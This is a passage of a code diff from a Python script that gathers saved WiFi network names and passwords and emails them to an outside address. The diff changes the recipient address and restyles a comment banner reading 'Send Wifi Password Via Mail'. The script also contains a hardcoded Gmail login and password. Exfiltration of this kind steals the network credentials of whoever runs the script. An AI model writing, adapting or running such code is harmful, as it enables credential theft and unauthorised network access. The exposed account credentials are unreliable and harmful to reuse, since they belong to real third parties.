@@ -25,9 +25,9 @@ if len(profile_names) != 0:
                 wifi_profile["password"] = password[1]
             wifi_list.append(wifi_profile)
 
-#########################
-## Send Wifi Password Via Mail
-#########################
+###############################
+# Send Wifi Password Via Mail #
+###############################
 
 import time
 
@@ -39,7 +39,7 @@ for item in wifi_list:
 try:
     email = 'abubakkar.swe@gmail.com'
     password = 'Abubakkar32'
-    send_to_email = "rakibsarkar26@gmail.com"
+    send_to_email = "Shuvomozumder101@gmail.com"
 
     msg = EmailMessage()
     msg['Subject'] = 'WiFi SSIDs and Passwords'
